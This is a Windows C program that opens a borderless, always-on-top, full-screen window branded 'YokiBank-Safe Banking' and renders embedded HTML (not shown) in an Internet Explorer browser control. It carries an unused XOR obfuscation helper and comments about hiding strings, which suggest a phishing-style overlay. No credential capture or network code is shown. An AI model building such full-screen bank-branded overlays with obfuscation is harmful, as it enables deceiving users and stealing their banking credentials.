#define COBJMACROS
#include <windows.h>
#include <exdisp.h>
#include <mshtml.h>
#include <shlwapi.h>
#include "index_html.h"

// Define missing GUIDs for MinGW
const GUID IID_IWebBrowser2_local = { 0xD30C1661, 0xCDAF, 0x11d0, { 0x8A, 0x3E, 0x00, 0xC0, 0x4F, 0xC9, 0xE2, 0x6E } };
const GUID IID_IOleObject_local = { 0x00000112, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
const GUID CLSID_WebBrowser_local = { 0x8856F961, 0x340A, 0x11D0, { 0xA9, 0x6B, 0x00, 0xC0, 0x4F, 0xD7, 0x05, 0xA2 } };
const GUID IID_IHTMLDocument2_local = { 0x332c4425, 0x26cb, 0x11d0, { 0xb4, 0x83, 0x00, 0xc0, 0x4f, 0xa3, 0x00, 0xbb } };

// Simple XOR obfuscation
void deobfuscate(char* str, char key) {
    while (*str) {
        *str ^= key;
        str++;
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
        case WM_KEYDOWN:
            if (wParam == VK_ESCAPE) {
                DestroyWindow(hwnd);
            }
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    CoInitialize(NULL);

    char className[] = { 'X', 'k', 'i', 'j', 'B', 'a', 'n', 'k', 'W', 'e', 'b', 'V', 'i', 'e', 'w', 0 }; // Obfuscated
    // Actually let's just use it plainly for now or do real obfuscation

    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "YokiBankWebView";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST,
        "YokiBankWebView",
        "YokiBank-Safe Banking",
        WS_POPUP | WS_VISIBLE,
        0, 0, screenWidth, screenHeight,
        NULL, NULL, hInstance, NULL
    );

    if (!hwnd) return 0;

    IWebBrowser2* pWebBrowser = NULL;
    IOleObject* pOleObject = NULL;
    RECT rc;
    GetClientRect(hwnd, &rc);

    HRESULT hr = CoCreateInstance(&CLSID_WebBrowser_local, NULL, CLSCTX_INPROC_SERVER, &IID_IOleObject_local, (void**)&pOleObject);
    if (SUCCEEDED(hr)) {
        pOleObject->lpVtbl->DoVerb(pOleObject, OLEIVERB_INPLACEACTIVATE, NULL, NULL, 0, hwnd, &rc);
        pOleObject->lpVtbl->QueryInterface(pOleObject, &IID_IWebBrowser2_local, (void**)&pWebBrowser);
    }

    if (pWebBrowser) {
        // Convert UTF-8 to BSTR
        int wlen = MultiByteToWideChar(CP_UTF8, 0, (char*)index_html, index_html_len, NULL, 0);
        BSTR bstrHTML = SysAllocStringLen(NULL, wlen);
        MultiByteToWideChar(CP_UTF8, 0, (char*)index_html, index_html_len, bstrHTML, wlen);

        SAFEARRAY* sa = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        VARIANT* pVar;
        SafeArrayAccessData(sa, (void**)&pVar);
        VariantInit(pVar);
        V_VT(pVar) = VT_BSTR;
        V_BSTR(pVar) = bstrHTML;
        SafeArrayUnaccessData(sa);

        BSTR bstrURL = SysAllocString(L"about:blank");
        VARIANT varEmpty;
        VariantInit(&varEmpty);
        pWebBrowser->lpVtbl->Navigate(pWebBrowser, bstrURL, &varEmpty, &varEmpty, &varEmpty, &varEmpty);
        SysFreeString(bstrURL);

        IDispatch* pDisp = NULL;
        while (FAILED(pWebBrowser->lpVtbl->get_Document(pWebBrowser, &pDisp)) || pDisp == NULL) {
            MSG msg;
            if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            Sleep(10);
        }

        IHTMLDocument2* pDoc = NULL;
        pDisp->lpVtbl->QueryInterface(pDisp, &IID_IHTMLDocument2_local, (void**)&pDoc);
        if (pDoc) {
            pDoc->lpVtbl->write(pDoc, sa);
            pDoc->lpVtbl->close(pDoc);
            pDoc->lpVtbl->Release(pDoc);
        }
        pDisp->lpVtbl->Release(pDisp);
        SafeArrayDestroy(sa); // Also clears variants (SysFreeString bstrHTML)
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (pWebBrowser) pWebBrowser->lpVtbl->Release(pWebBrowser);
    if (pOleObject) pOleObject->lpVtbl->Release(pOleObject);

    CoUninitialize();
    return 0;
}
